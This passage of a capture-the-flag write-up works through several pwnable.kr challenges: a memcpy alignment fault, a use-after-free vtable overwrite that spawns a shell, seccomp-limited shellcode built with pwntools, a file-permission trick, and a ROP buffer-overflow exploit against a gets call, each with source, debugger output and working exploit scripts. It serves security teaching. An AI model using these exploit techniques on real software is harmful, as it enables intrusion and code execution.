	src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	size_t sizes[10];
	int i=0;

	// setup experiment parameters
	for(e=4; e<14; e++){	// 2^13 = 8K
		low = pow(2,e-1);
		high = pow(2,e);
		printf("specify the memcpy amount between %d ~ %d : ", low, high);
		scanf("%d", &size);
		if( size < low || size > high ){
			printf("don't mess with the experiment.\n");
			exit(0);
		}
		sizes[i++] = size;
	}

	sleep(1);
	printf("ok, lets run the experiment with your configuration\n");
	sleep(1);

	// run experiment
	for(i=0; i<10; i++){
		size = sizes[i];
		printf("experiment %d : memcpy with buffer size %d\n", i+1, size);
		dest = malloc( size );

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		slow_memcpy(dest, src, size);		// byte-to-byte memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1);

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		fast_memcpy(dest, src, size);		// block-to-block memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1);
		printf("\n");
	}

	printf("thanks for helping my experiment!\n");
	printf("flag : ----- erased in this source code -----\n");
	return 0;
}
```

When executed with least input in each range, the program stops at experiment 5. Let's try debugging
```bash
ok, lets run the experiment with your configuration
experiment 1 : memcpy with buffer size 8
ellapsed CPU cycles for slow_memcpy : 3438
ellapsed CPU cycles for fast_memcpy : 268

experiment 2 : memcpy with buffer size 16
ellapsed CPU cycles for slow_memcpy : 316
ellapsed CPU cycles for fast_memcpy : 402

experiment 3 : memcpy with buffer size 32
ellapsed CPU cycles for slow_memcpy : 438
ellapsed CPU cycles for fast_memcpy : 492

experiment 4 : memcpy with buffer size 64
ellapsed CPU cycles for slow_memcpy : 826
ellapsed CPU cycles for fast_memcpy : 212

experiment 5 : memcpy with buffer size 128
ellapsed CPU cycles for slow_memcpy : 1358

Program received signal SIGSEGV, Segmentation fault.
0x080487cc in fast_memcpy ()
```

Error occurs in function ``fast_memcpy`` which contains inline asm code.

Only two instructions are used :

|instruction|description|
|-|-|
|MOVDQA|Moves a double quadword from the source operand (second operand) to the destination operand (first operand). This instruction can be used to load an XMM register from a 128-bit memory location, to store the contents of an XMM register into a 128-bit memory location, or to move data between two XMM registers. When the source or destination operand is a memory operand, **the operand must be aligned on a 16-byte boundary** or a general-protection exception (#GP) will be generated. To move a double quadword to or from unaligned memory locations, use the MOVDQU instruction.|
|MOVNTPS|Moves the double quadword in the source operand (second operand) to the destination operand (first operand) using a non-temporal hint to minimize cache pollution during the write to memory. The source operand is an XMM register, which is assumed to contain four packed single-precision floating-point values. The destination operand is a 128-bit memory location.|

As stated above, movdqa requires memory locations to be aligned on 16-byte boundary. Which might be the cause of the error.

I've set a breakpoint right before ``fast_memcpy`` and checked memory locations (least input in each range)

source: (always aligned)

destination:
1. 0x804c410
2. 0x804c420
3. 0x804c43**8**
4. 0x804c460
5. 0x804c4a**8**

So I added 8 to 2nd~4th input and tried again. But sigfault again.

After repeating previous process several times, I was able to reach the end of the program without any errors.

```bash
memcpy@prowl:~$ nc 0 9022
Hey, I have a boring assignment for CS class.. :(
The assignment is simple.
-----------------------------------------------------
- What is the best implementation of memcpy?        -
- 1. implement your own slow/fast version of memcpy -
- 2. compare them with various size of data         -
- 3. conclude your experiment and submit report     -
-----------------------------------------------------
This time, just help me out with my experiment and get flag
No fancy hacking, I promise :D
specify the memcpy amount between 8 ~ 16 : 8
specify the memcpy amount between 16 ~ 32 : 24
specify the memcpy amount between 32 ~ 64 : 40
specify the memcpy amount between 64 ~ 128 : 72
specify the memcpy amount between 128 ~ 256 : 136
specify the memcpy amount between 256 ~ 512 : 264
specify the memcpy amount between 512 ~ 1024 : 520
specify the memcpy amount between 1024 ~ 2048 : 1032
specify the memcpy amount between 2048 ~ 4096 : 2056
specify the memcpy amount between 4096 ~ 8192 : 4104
ok, lets run the experiment with your configuration
experiment 1 : memcpy with buffer size 8
ellapsed CPU cycles for slow_memcpy : 3250
ellapsed CPU cycles for fast_memcpy : 482

experiment 2 : memcpy with buffer size 24
ellapsed CPU cycles for slow_memcpy : 500
ellapsed CPU cycles for fast_memcpy : 408

experiment 3 : memcpy with buffer size 40
ellapsed CPU cycles for slow_memcpy : 682
ellapsed CPU cycles for fast_memcpy : 580

experiment 4 : memcpy with buffer size 72
ellapsed CPU cycles for slow_memcpy : 1138
ellapsed CPU cycles for fast_memcpy : 378

experiment 5 : memcpy with buffer size 136
ellapsed CPU cycles for slow_memcpy : 1832
ellapsed CPU cycles for fast_memcpy : 432

experiment 6 : memcpy with buffer size 264
ellapsed CPU cycles for slow_memcpy : 3570
ellapsed CPU cycles for fast_memcpy : 488

experiment 7 : memcpy with buffer size 520
ellapsed CPU cycles for slow_memcpy : 6616
ellapsed CPU cycles for fast_memcpy : 514

experiment 8 : memcpy with buffer size 1032
ellapsed CPU cycles for slow_memcpy : 13480
ellapsed CPU cycles for fast_memcpy : 716

experiment 9 : memcpy with buffer size 2056
ellapsed CPU cycles for slow_memcpy : 18218
ellapsed CPU cycles for fast_memcpy : 980

experiment 10 : memcpy with buffer size 4104
ellapsed CPU cycles for slow_memcpy : 51024
ellapsed CPU cycles for fast_memcpy : 2058

thanks for helping my experiment!
flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt
```

```
sources:
https://mudongliang.github.io/x86/html/file_module_x86_id_183.html
https://mudongliang.github.io/x86/html/file_module_x86_id_197.html
```

## 16. uaf
```c++
#include <fcntl.h>
#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout << "My name is " << name << endl;
                cout << "I am " << age << " years old" << endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout << "1. use\n2. after\n3. free\n";
                cin >> op;

                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout << "your data is allocated" << endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
```
``Use After Free Bug`` is a heap exploit, where program allocates (``malloc``) memory to a used (``free``) block. Allowing the attacker to change the program flow.

After the main function allocates two variables (``m``, ``w``), we could delete (``free``) the variables and overwrite the content with newly created ``data``.

Since we could access the function ``introduce``, I figured that we could overwrite the address with ``give_shell``(0x40117a).

this is the code that gets executed when option ``1`` is selected
```nasm
0x0000000000400fcd <+265>:   mov    rax,QWORD PTR [rbp-0x38]
0x0000000000400fd1 <+269>:   mov    rax,QWORD PTR [rax]
0x0000000000400fd4 <+272>:   add    rax,0x8
0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]
0x0000000000400fdb <+279>:   mov    rax,QWORD PTR [rbp-0x38]
0x0000000000400fdf <+283>:   mov    rdi,rax
0x0000000000400fe2 <+286>:   call   rdx
0x0000000000400fe4 <+288>:   mov    rax,QWORD PTR [rbp-0x30]
0x0000000000400fe8 <+292>:   mov    rax,QWORD PTR [rax]
0x0000000000400feb <+295>:   add    rax,0x8
0x0000000000400fef <+299>:   mov    rdx,QWORD PTR [rax]
0x0000000000400ff2 <+302>:   mov    rax,QWORD PTR [rbp-0x30]
0x0000000000400ff6 <+306>:   mov    rdi,rax
0x0000000000400ff9 <+309>:   call   rdx
```
It gets the address inside rbp-0x38, let's call this ``A``. After that, it gets the address inside ``A`` which I'm calling ``B``. Then again, it gets the address inside ``B+8`` which I'm calling ``C``. And finally, function ``C`` gets called.

Inside rbp-0x38, there should be ther address for variable ``m`` (``A``)
```bash
gdb-peda$ x/4wx $rbp-0x38
0x7ffdb3d37bc8: 0x00e24c50      0x00000000      0x00e24ca0      0x00000000
```
This is how ``m`` looks like:
```
gdb-peda$ x/80wx 0x0212bc50
0x212bc50:      0x00401570      0x00000000      0x00000019      0x00000000
0x212bc60:      0x0212bc38      0x00000000      0x00000031      0x00000000
```
Let's take a look at 0x401570 (``B``)
```
gdb-peda$ x/20wx 0x401570
0x401570 <vtable for Man+16>:   0x0040117a      0x00000000      0x004012d2      0x00000000
0x401580 <vtable for Human>:    0x00000000      0x00000000      0x004015f0      0x00000000
0x401590 <vtable for Human+16>: 0x0040117a      0x00000000      0x00401192      0x00000000
0x4015a0 <typeinfo name for Woman>:     0x6d6f5735      0x00006e61      0x00000000      0x00000000
0x4015b0 <typeinfo for Woman>:  0x00602390      0x00000000      0x004015a0      0x00000000
```
So, the address 0x4012d2 is getting called when option ``1`` is selected (function ``introduce``) (``C``)

Which means, by overwriting first 4 bytes of ``m``, we could call ``give_shell`` instead of ``introduce``

Now lets find exactly where the new ``data`` is allocated.

address of ``m`` : 0xe24c50

1st read after free :
arg[0]: 0x3
arg[1]: 0xe24ca0 --> 0xe24c40 --> 0x0
arg[2]: 0x4

2nd read :
arg[0]: 0x4
arg[1]: 0xe24c50 --> 0x0
arg[2]: 0x4

So, we have to read twice to overwrite the first 4 bytes of ``m``

payload:
```bash
uaf@prowl:~$ python -c 'print "\x68\x15\x40\x00"' > /tmp/jun_uaf/a
uaf@prowl:~$ ./uaf 4 /tmp/jun_uaf/a
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
yay_f1ag_aft3r_pwning
```

```
info proc mappings
set print asm-demangle on
```


## 17. asm
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
        }

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

        if (seccomp_load(ctx) < 0){
                seccomp_release(ctx);
                printf("seccomp error\n");
                exit(0);
        }
        seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

        setvbuf(stdout, 0, _IONBF, 0);
        setvbuf(stdin, 0, _IOLBF, 0);

        printf("Welcome to shellcoding practice challenge.\n");
        printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
        printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
        printf("If this does not challenge you. you should play 'asg' challenge :)\n");

        char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
        memset(sh, 0x90, 0x1000);
        memcpy(sh, stub, strlen(stub));

        int offset = sizeof(stub);
        printf("give me your x64 shellcode: ");
        read(0, sh+offset, 1000);

        alarm(10);
        chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
        sandbox();
        ((void (*)(void))sh)();
        return 0;
}
```
The program prompts the user to input 64bit shellcode.

But we could only use read/write/open to get the flag.

I created the shellcode using pwntool's shellcraft

exploit.py:
```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

sc = ''
sc += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
sc += shellcraft.open('rsp', 0, 0)
sc += shellcraft.read('rax', 'rsp', 50)
sc += shellcraft.write(1, 'rsp', 50)

p = remote('0', 9026)
p.recvuntil(': ')
p.sendline(asm(sc))
p.interactive()
```
got the flag:
```bash
[DEBUG] Received 0x32 bytes:
    'Mak1ng_shelLcodE_i5_veRy_eaSy\n'
    'lease_read_this_file'
Mak1ng_shelLcodE_i5_veRy_eaSy
lease_read_this_file[*] Got EOF while reading in interactive
$
```

## 18. unlink

## 19. blukat
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
char flag[100];
char password[100];
char* key = "3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+";
void calc_flag(char* s){
        int i;
        for(i=0; i<strlen(s); i++){
                flag[i] = s[i] ^ key[i];
        }
        printf("%s\n", flag);
}
int main(){
        FILE* fp = fopen("/home/blukat/password", "r");
        fgets(password, 100, fp);
        char buf[100];
        printf("guess the password!\n");
        fgets(buf, 128, stdin);
        if(!strcmp(password, buf)){
                printf("congrats! here is your flag: ");
                calc_flag(password);
        }
        else{
                printf("wrong guess!\n");
                exit(0);
        }
        return 0;
}
```
Unlike other problems the ``password`` file could be read inside gdb.

So I checked the permissions:
```bash
blukat@prowl:~$ ls -l
total 20
-r-xr-sr-x 1 root blukat_pwn 9144 Aug  8  2018 blukat
-rw-r--r-- 1 root root        645 Aug  8  2018 blukat.c
-rw-r----- 1 root blukat_pwn   33 Jan  6  2017 password
```
It allows read access to group ``blukat_pwn``

I tried ``groups`` to check what groups I am currently included in.
```bash
blukat@prowl:~$ groups
blukat blukat_pwn
```
We could see that we already have read permission to this file.

Then why does ``cat`` output permission denied?
```bash
blukat@prowl:~$ cat password
cat: password: Permission denied
```
It turns out that the "Permission denied" message was the content of the file.

So I inputted the content to blukat and got the flag
```bash
blukat@prowl:~$ ./blukat
guess the password!
cat: password: Permission denied
congrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!
```

## 20. horcruxes
This time, the source is not provided.
```nasm
Dump of assembler code for function main:
   0x0809ff24 <+0>:     lea    ecx,[esp+0x4]
   ...
   0x0809ff67 <+67>:    add    esp,0x10
   0x0809ff6a <+70>:    call   0x80a0324 <hint>
   0x0809ff6f <+75>:    call   0x80a0177 <init_ABCDEFG>
   0x0809ff74 <+80>:    sub    esp,0xc
   ...
   0x0809fff9 <+213>:   add    esp,0x10
   0x0809fffc <+216>:   call   0x80a0009 <ropme>
   0x080a0001 <+221>:   mov    ecx,DWORD PTR [ebp-0x4]
   0x080a0004 <+224>:   leave
   0x080a0005 <+225>:   lea    esp,[ecx-0x4]
   0x080a0008 <+228>:   ret
End of assembler dump.
```
The main function calls 3 functions (excluding libc functions). ``hint`` literally prints out hint string, ``init_ABCDEFG`` initializes variables a ~ g, and ``ropme`` which is the only function that takes input from user.

Let's take a look at ``ropme``
```nasm
Dump of assembler code for function ropme:
   0x080a0009 <+0>:     push   ebp
   0x080a000a <+1>:     mov    ebp,esp
   0x080a000c <+3>:     sub    esp,0x78
   0x080a000f <+6>:     sub    esp,0xc
   0x080a0012 <+9>:     push   0x80a050c
   0x080a0017 <+14>:    call   0x809fc40 <printf@plt>
   0x080a001c <+19>:    add    esp,0x10
   0x080a001f <+22>:    sub    esp,0x8
   0x080a0022 <+25>:    lea    eax,[ebp-0x10]
   0x080a0025 <+28>:    push   eax
   0x080a0026 <+29>:    push   0x80a0519
   0x080a002b <+34>:    call   0x809fd10 <__isoc99_scanf@plt>
   0x080a0030 <+39>:    add    esp,0x10
   0x080a0033 <+42>:    call   0x809fc70 <getchar@plt>
       0x080a0038 <+47>:    mov    edx,DWORD PTR [ebp-0x10]
       0x080a003b <+50>:    mov    eax,ds:0x80a2088
       0x080a0040 <+55>:    cmp    edx,eax
       0x080a0042 <+57>:    jne    0x80a004e <ropme+69>
       0x080a0044 <+59>:    call   0x809fe4b <A>
       0x080a0049 <+64>:    jmp    0x80a0170 <ropme+359>
       ...
       <repeat for B~G>
       ...
   0x080a00d2 <+201>:   sub    esp,0xc
   0x080a00d5 <+204>:   push   0x80a051c                ;"how many exp points?"
   0x080a00da <+209>:   call   0x809fc40 <printf@plt>
   0x080a00df <+214>:   add    esp,0x10
   0x080a00e2 <+217>:   sub    esp,0xc
   0x080a00e5 <+220>:   lea    eax,[ebp-0x74]
   0x080a00e8 <+223>:   push   eax
   0x080a00e9 <+224>:   call   0x809fc50 <gets@plt>
   0x080a00ee <+229>:   add    esp,0x10
   0x080a00f1 <+232>:   sub    esp,0xc
   0x080a00f4 <+235>:   lea    eax,[ebp-0x74]
   0x080a00f7 <+238>:   push   eax
   0x080a00f8 <+239>:   call   0x809fd20 <atoi@plt>
   0x080a00fd <+244>:   add    esp,0x10
   0x080a0100 <+247>:   mov    edx,eax
   0x080a0102 <+249>:   mov    eax,ds:0x80a2078
   0x080a0107 <+254>:   cmp    edx,eax                  ;compare input with sum
   0x080a0109 <+256>:   jne    0x80a0160 <ropme+343>
   0x080a010b <+258>:   sub    esp,0x8
   0x080a010e <+261>:   push   0x0
   0x080a0110 <+263>:   push   0x80a053c
   0x080a0115 <+268>:   call   0x809fcc0 <open@plt>
   0x080a011a <+273>:   add    esp,0x10
   0x080a011d <+276>:   mov    DWORD PTR [ebp-0xc],eax
   0x080a0120 <+279>:   sub    esp,0x4
   0x080a0123 <+282>:   push   0x64
   0x080a0125 <+284>:   lea    eax,[ebp-0x74]
   0x080a0128 <+287>:   push   eax
   0x080a0129 <+288>:   push   DWORD PTR [ebp-0xc]
   0x080a012c <+291>:   call   0x809fc30 <read@plt>
   0x080a0131 <+296>:   add    esp,0x10
   0x080a0134 <+299>:   mov    BYTE PTR [ebp+eax*1-0x74],0x0
   0x080a0139 <+304>:   sub    esp,0xc
   0x080a013c <+307>:   lea    eax,[ebp-0x74]
   0x080a013f <+310>:   push   eax
   0x080a0140 <+311>:   call   0x809fca0 <puts@plt>
   0x080a0145 <+316>:   add    esp,0x10
   0x080a0148 <+319>:   sub    esp,0xc
   0x080a014b <+322>:   push   DWORD PTR [ebp-0xc]
   0x080a014e <+325>:   call   0x809fd30 <close@plt>
   0x080a0153 <+330>:   add    esp,0x10
   0x080a0156 <+333>:   sub    esp,0xc
   0x080a0159 <+336>:   push   0x0
   0x080a015b <+338>:   call   0x809fcb0 <exit@plt>
   0x080a0160 <+343>:   sub    esp,0xc
   0x080a0163 <+346>:   push   0x80a0544
   0x080a0168 <+351>:   call   0x809fca0 <puts@plt>     ;"you need more exp points"
   0x080a016d <+356>:   add    esp,0x10
   0x080a0170 <+359>:   mov    eax,0x0
   0x080a0175 <+364>:   leave
   0x080a0176 <+365>:   ret
End of assembler dump.
```
This function gets decimal input using ``scanf`` (select menu)

Then it compares with randomly generated variables a ~ g and calls the according function(A ~ G) if they're equal.

Functions A ~ G prints variables a~g.

At last, it gets another input using ``gets`` and compares with sum of a~g. If they're equal, the program reads and outputs flag file.

Because the last input is taken by ``gets``, the program is bulnerable to bof.
But since NXbit is enabled,
```bash
horcruxes@prowl:~$ checksec horcruxes
[*] '/home/horcruxes/horcruxes'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x809f000)
```
we have to use ROP.

And because we are using ``gets`` and the ``ropme`` function address contains \x0a (line-feed), we cannot just jump to file-read-output part of the ``ropme`` function.

payload structure:
1. dummy value (0x78 bytes)
2. return address of main : addresses of A~G (4 bytes each, 28 bytes total)
3. return address of G : main+216 ``call ropme`` (4 bytes)

This way, we could get all the random values (a~g) and return to the main function to input the sum.

exploit code :
```python
from pwn import *

#context(log_level='debug')
b = ELF('/home/horcruxes/horcruxes')
r = remote('0', 9032)

payload = ''
payload +=  'a'*0x74
payload += 'a'*4
for i in range(ord('A'),ord('H')):
	payload += p32(b.symbols[chr(i)])
payload += p32(0x0809fffc)

r.recvuntil(':')
r.sendline('1')
r.recvuntil(': ')
r.sendline(payload)

sum = 0
for i in range(ord('A'),ord('H')):
	r.recvuntil('+')
	sum+= int(r.recvuntil(')')[:-1])
r.recvuntil(':')
r.sendline('1')
r.recvuntil(': ')
r.sendline(str(sum))
r.interactive()
```

result:
```bash
horcruxes@prowl:/tmp/junhor$ python e.py
[*] '/home/horcruxes/horcruxes'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x809f000)
[+] Opening connection to 0 on port 9032: Done
[*] Switching to interactive mode
Magic_spell_1s_4vad4_K3daVr4!

[*] Got EOF while reading in interactive
```
